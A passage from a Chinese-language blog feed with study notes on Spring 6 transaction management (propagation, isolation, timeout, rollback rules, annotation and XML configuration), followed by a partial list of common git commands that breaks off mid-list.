这两条update语句必须同时成功，或同时失败。）</p><p>第一步：准备数据库表</p><p>第二步：创建包结构</p><p>第三步：准备POJO类</p><p>第四步：编写持久层</p><p>第五步：编写业务层</p><p>第六步：编写Spring配置文件</p><p>第七步：编写表示层（测试程序）</p><p>模拟异常</p><h4 id="16-3-Spring对事务的支持"><a href="#16-3-Spring对事务的支持" class="headerlink" title="16.3 Spring对事务的支持"></a>16.3 Spring对事务的支持</h4><p><strong>Spring实现事务的两种方式</strong></p><p>●编程式事务<br>        ○通过编写代码的方式来实现事务的管理。<br>●声明式事务<br>        ○基于注解方式<br>        ○基于XML配置方式Spring事务管理API</p><p> <strong>Spring事务管理API</strong> </p><p>Spring对事务的管理底层实现方式是基于AOP实现的。采用AOP的方式进行了封装。所以Spring专门针对事务开发了一套API，API的核心接口如下：</p><p>PlatformTransactionManager接口：spring事务管理器的核心接口。在Spring6中它有两个实现：</p><p>●DataSourceTransactionManager：支持JdbcTemplate、MyBatis、Hibernate等事务管理。</p><p>●JtaTransactionManager：支持分布式事务管理。</p><p>如果要在Spring6中使用JdbcTemplate，就要使用DataSourceTransactionManager来管理事务。（Spring内置写好了，可以直接用。）</p><p> 声明式事务之注解实现方式 </p><p>在spring配置文件中配置事务管理器。</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>transactionManager<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.jdbc.datasource.DataSourceTransactionManager<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dataSource<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dataSource<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span></code></pre><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>context</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/context<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>tx</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/tx<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd                           http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd                           http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                           <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">tx:</span>annotation-driven</span> <span class="token attr-name">transaction-manager</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>transactionManager<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></code></pre><p>在service类上或方法上添加@Transactional注解<br>在类上添加该注解，该类中所有的方法都有事务。在某个方法上添加该注解，表示只有这个方法使用事务。</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Service</span><span class="token punctuation">(</span><span class="token string">"accountService"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Transactional</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AccountServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">AccountService</span> <span class="token punctuation">{</span></code></pre><p><strong>事务中的重点属性</strong>：<br>●事务传播行为<br>●事务隔离级别<br>●事务超时<br>●只读事务<br>●设置出现哪些异常回滚事务<br>●设置出现哪些异常不回滚事务</p><p><strong>事务传播行为</strong><br>什么是事务的传播行为？<br>在service类中有a()方法和b()方法，a()方法上有事务，b()方法上也有事务，当a()方法执行过程中调用了b()方法，事务是如何传递的？合并到一个事务里？还是开启一个新的事务？这就是事务传播行为。</p><p>一共有七种传播行为：<br>●REQUIRED：支持当前事务，如果不存在就新建一个(默认)【没有就新建，有就加入】<br>●SUPPORTS：支持当前事务，如果当前没有事务，就以非事务方式执行【有就加入，没有就不管了】<br>●MANDATORY：必须运行在一个事务中，如果当前没有事务正在发生，将抛出一个异常【有就加入，没有就抛异常】<br>●REQUIRES_NEW：开启一个新的事务，如果一个事务已经存在，则将这个存在的事务挂起【不管有没有，直接开启一个新事务，开启的新事务和之前的事务不存在嵌套关系，之前事务被挂起】<br>●NOT_SUPPORTED：以非事务方式运行，如果有事务存在，挂起当前事务【不支持事务，存在就挂起】<br>●NEVER：以非事务方式运行，如果有事务存在，抛出异常【不支持事务，存在就抛异常】<br>●NESTED：如果当前正有一个事务在进行中，则该方法应当运行在一个嵌套式事务中。被嵌套的事务可以独立于外层事务进行提交或回滚。如果外层事务不存在，行为就像REQUIRED一样。【有事务的话，就在这个事务里再嵌套一个完全独立的事务，嵌套的事务可以独立的提交和回滚。没有事务就和REQUIRED一样。】<br>在代码中设置事务的传播行为：</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Transactional</span><span class="token punctuation">(</span>propagation <span class="token operator">=</span> Propagation<span class="token punctuation">.</span>REQUIRED<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span>Account act<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 这里调用dao的insert方法。</span>    accountDao<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>act<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 保存act-003账户</span>    <span class="token comment" spellcheck="true">// 创建账户对象</span>    Account act2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Account</span><span class="token punctuation">(</span><span class="token string">"act-004"</span><span class="token punctuation">,</span> <span class="token number">1000.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        accountService<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span>act2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 保存act-004账户</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 继续往后进行我当前1号事务自己的事儿。</span><span class="token punctuation">}</span></code></pre><p><strong>事务隔离级别</strong><br>事务隔离级别类似于教室A和教室B之间的那道墙，隔离级别越高表示墙体越厚。隔音效果越好。<br>数据库中读取数据存在的三大问题：（三大读问题）<br>●脏读：读取到没有提交到数据库的数据，叫做脏读。<br>●不可重复读：在同一个事务当中，第一次和第二次读取的数据不一样。<br>●幻读：读到的数据是假的。<br>事务隔离级别包括四个级别：<br>●读未提交：READ_UNCOMMITTED<br>        ○这种隔离级别，存在脏读问题，所谓的脏读(dirty read)表示能够读取到其它事务未提交的数据。<br>●读提交：READ_COMMITTED<br>        ○解决了脏读问题，其它事务提交之后才能读到，但存在不可重复读问题。<br>●可重复读：REPEATABLE_READ<br>        ○解决了不可重复读，可以达到可重复读效果，只要当前事务不结束，读取到的数据一直都是一样的。但存在幻读问题。<br>●序列化：SERIALIZABLE<br>        ○解决了幻读问题，事务排队执行。不支持并发。</p><p> <strong>事务超时</strong> </p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//代码不会计入超时时间</span><span class="token annotation punctuation">@Transactional</span><span class="token punctuation">(</span>timeout <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 设置事务超时时间为10秒。</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span>Account act<span class="token punctuation">)</span> <span class="token punctuation">{</span>    accountDao<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>act<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 睡眠一会</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span> <span class="token operator">*</span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//超时时间会纳入超时时间</span><span class="token annotation punctuation">@Transactional</span><span class="token punctuation">(</span>timeout <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 设置事务超时时间为10秒。</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span>Account act<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 睡眠一会</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span> <span class="token operator">*</span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    accountDao<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>act<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>以上代码表示设置事务的超时时间为10秒。</p><p>表示超过10秒如果该事务中所有的DML语句还没有执行完毕的话，最终结果会选择回滚。</p><p>默认值-1，表示没有时间限制。</p><p>这里有个坑，事务的超时时间指的是哪段时间？</p><p>在当前事务当中，最后一条DML语句执行之前的时间。如果最后一条DML语句后面很有很多业务逻辑，这些业务代码执行的时间不被计入超时时间。</p><p>当然，如果想让整个方法的所有代码都计入超时时间的话，可以在方法最后一行添加一行无关紧要的DML语句。</p><pre><code>@Transactional(readOnly = true)</code></pre><p>将当前事务设置为只读事务，在该事务执行过程中只允许select语句执行，delete insert update均不可执行。<br>该特性的作用是：启动spring的优化策略。提高select语句执行效率。<br>如果该事务中确实没有增删改操作，建议设置为只读事务。</p><p>以下代码的超时不会被计入超时时间</p><p><strong>设置哪些异常回滚事务</strong></p><pre><code>//表示只有发生RuntimeException异常或该异常的子类异常才回滚。@Transactional(rollbackFor = RuntimeException.class)//表示发生NullPointerException或该异常的子类异常不回滚，其他异常则回滚。@Transactional(noRollbackFor = NullPointerException.class)</code></pre><p>全注解式开发</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span><span class="token string">"com.powernode.bank"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@EnableTransactionManagement</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Spring6Config</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> DataSource <span class="token function">getDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        DruidDataSource dataSource <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DruidDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dataSource<span class="token punctuation">.</span><span class="token function">setDriverClassName</span><span class="token punctuation">(</span><span class="token string">"com.mysql.cj.jdbc.Driver"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dataSource<span class="token punctuation">.</span><span class="token function">setUrl</span><span class="token punctuation">(</span><span class="token string">"jdbc:mysql://localhost:3306/spring6"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dataSource<span class="token punctuation">.</span><span class="token function">setUsername</span><span class="token punctuation">(</span><span class="token string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dataSource<span class="token punctuation">.</span><span class="token function">setPassword</span><span class="token punctuation">(</span><span class="token string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> dataSource<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Bean</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"jdbcTemplate"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> JdbcTemplate <span class="token function">getJdbcTemplate</span><span class="token punctuation">(</span>DataSource dataSource<span class="token punctuation">)</span><span class="token punctuation">{</span>        JdbcTemplate jdbcTemplate <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JdbcTemplate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        jdbcTemplate<span class="token punctuation">.</span><span class="token function">setDataSource</span><span class="token punctuation">(</span>dataSource<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> jdbcTemplate<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> DataSourceTransactionManager <span class="token function">getDataSourceTransactionManager</span><span class="token punctuation">(</span>DataSource dataSource<span class="token punctuation">)</span><span class="token punctuation">{</span>        DataSourceTransactionManager dataSourceTransactionManager <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataSourceTransactionManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        dataSourceTransactionManager<span class="token punctuation">.</span><span class="token function">setDataSource</span><span class="token punctuation">(</span>dataSource<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> dataSourceTransactionManager<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>声明式事务XML实现</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>context</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/context<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>tx</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/tx<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>aop</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/aop<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd                           http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd                           http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd                           http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>component-scan</span> <span class="token attr-name">base-package</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.bank<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dataSource<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.alibaba.druid.pool.DruidDataSource<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>driverClassName<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.mysql.cj.jdbc.Driver<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>jdbc:mysql://localhost:3306/spring6<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>jdbcTemplate<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.jdbc.core.JdbcTemplate<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dataSource<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dataSource<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!--配置事务管理器--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>transactionManager<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.jdbc.datasource.DataSourceTransactionManager<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dataSource<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dataSource<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!--配置通知--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">tx:</span>advice</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>txAdvice<span class="token punctuation">"</span></span> <span class="token attr-name">transaction-manager</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>txManager<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">tx:</span>attributes</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">tx:</span>method</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>save*<span class="token punctuation">"</span></span> <span class="token attr-name">propagation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>REQUIRED<span class="token punctuation">"</span></span> <span class="token attr-name">rollback-for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>java.lang.Throwable<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">tx:</span>method</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>del*<span class="token punctuation">"</span></span> <span class="token attr-name">propagation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>REQUIRED<span class="token punctuation">"</span></span> <span class="token attr-name">rollback-for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>java.lang.Throwable<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">tx:</span>method</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>update*<span class="token punctuation">"</span></span> <span class="token attr-name">propagation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>REQUIRED<span class="token punctuation">"</span></span> <span class="token attr-name">rollback-for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>java.lang.Throwable<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">tx:</span>method</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>transfer*<span class="token punctuation">"</span></span> <span class="token attr-name">propagation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>REQUIRED<span class="token punctuation">"</span></span> <span class="token attr-name">rollback-for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>java.lang.Throwable<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">tx:</span>attributes</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">tx:</span>advice</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!--配置切面--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">aop:</span>config</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">aop:</span>pointcut</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>txPointcut<span class="token punctuation">"</span></span> <span class="token attr-name">expression</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>execution(* com.powernode.bank.service..*(..))<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token comment" spellcheck="true">&lt;!--切面 = 通知 + 切点--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">aop:</span>advisor</span> <span class="token attr-name">advice-ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>txAdvice<span class="token punctuation">"</span></span> <span class="token attr-name">pointcut-ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>txPointcut<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">aop:</span>config</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git常用命令</title>
      <link href="/2020/07/30/git-chang-yong-ming-ling/"/>
      <url>/2020/07/30/git-chang-yong-ming-ling/</url>
      
        <content type="html"><![CDATA[<h4 id="一、仓库"><a href="#一、仓库" class="headerlink" title="一、仓库"></a>一、仓库</h4><pre><code># 在当前目录新建一个Git代码库$ git init# 新建一个目录，将其初始化为Git代码库$ git init [project-name]# 下载一个项目和它的整个代码历史$ git clone [url]</code></pre><h4 id="二、配置"><a href="#二、配置" class="headerlink" title="二、配置"></a>二、配置</h4><pre><code># 显示当前的Git配置$ git config --list# 编辑Git配置文件$ git config -e [--global]# 设置提交代码时的用户信息$ git config [--global] user.name &quot;[name]&quot;$ git config [--global] user.email &quot;[email address]&quot;</code></pre><h4 id="三、增加-删除文件"><a href="#三、增加-删除文件" class="headerlink" title="三、增加/删除文件"></a>三、增加/删除文件</h4><pre><code># 添加指定文件到暂存区$ git add [file1] [file2] ...# 添加指定目录到暂存区，包括子目录$ git add [dir]# 添加当前目录的所有文件到暂存区$ git add .# 添加每个变化前，都会要求确认# 对于同一个文件的多处变化，可以实现分次提交$ git add -p# 删除工作区文件，并且将这次删除放入暂存区$ git rm [file1] [file2] ...# 停止追踪指定文件，但该文件会保留在工作区，--cached删除远程仓库$ git rm --cached [file] (git rm --cached -r .idea)# 改名文件，并且将这个改名放入暂存区$ git mv [file-original] [file-renamed]</code></pre><h4 id="四、代码提交"><a href="#四、代码提交" class="headerlink" title="四、代码提交"></a>四、代码提交</h4><pre><code># 提交暂存区到仓库区$ git commit -m [message]# 提交暂存区的指定文件到仓库区$ git commit [file1] [file2] ... -m [message]# 提交工作区自上次commit之后的变化，直接到仓库区$ git commit -a# 提交时显示所有diff信息$ git commit -v# 使用一次新的commit，替代上一次提交# 如果代码没有任何新变化，则用来改写上一次commit的提交信息$ git commit --amend -m [message]# 重做上一次commit，并包括指定文件的新变化$ git commit --amend [file1] [file2] ...</code></pre><h4 id="五、分支"><a href="#五、分支" class="headerlink" title="五、分支"></a>五、分支</h4><pre><code># 列出所有本地分支$ git branch# 列出所有远程分支$ git branch -r# 列出所有本地分支和远程分支$ git branch -a# 新建一个分支，但依然停留在当前分支$ git branch [branch-name]# 新建一个分支，并切换到该分支$ git checkout -b [branch]# 获取某个版本的代码$ git checkout [commit]# 新建一个分支，指向指定commit$ git branch [branch] [commit]# 新建一个分支，与指定的远程分支建立追踪关系$ git branch --track [branch] [remote-branch]# 切换到指定分支，并更新工作区$ git checkout [branch-name]# 切换到上一个分支$ git checkout -# 建立追踪关系，在现有分支与指定的远程分支之间$ git branch --set-upstream [branch] [remote-branch]# 合并指定分支到当前分支$ git merge [branch]# 选择一个commit，合并进当前分支$ git cherry-pick [commit]# 删除分支$ git branch -d [branch-name]# 删除远程分支$ git push origin --delete [branch-name]$ git branch -dr [remote/branch]</code></pre><h4 id="六、标签"><a href="#六、标签" class="headerlink" title="六、标签"></a>六、标签</h4><pre><code># 列出所有tag$ git tag# 新建一个tag在当前commit$ git tag [tag]# 新建一个tag在指定commit$ git tag [tag] [commit]# 删除本地tag$ git tag -d [tag]# 删除远程tag$ git push origin :refs/tags/[tagName]# 查看tag信息$ git show [tag]# 提交指定tag$ git push [remote] [tag]# 提交所有tag$ git push [remote] --tags# 新建一个分支，指向某个tag$ git checkout -b [branch] [tag]</code></pre><h4 id="七、查看信息"><a href="#七、查看信息" class="headerlink" title="七、查看信息"></a>七、查看信息</h4><pre><code># 显示有变更的文件$ git status# 显示当前分支的版本历史$ git log# 显示commit历史，以及每次commit发生变更的文件$ git log --stat# 搜索提交历史，根据关键词$ git log -S [keyword]# 显示某个commit之后的所有变动，每个commit占据一行$ git log [tag] HEAD --pretty=format:%s# 显示某个commit之后的所有变动，其&quot;提交说明&quot;必须符合搜索条件$ git log [tag] HEAD --grep feature# 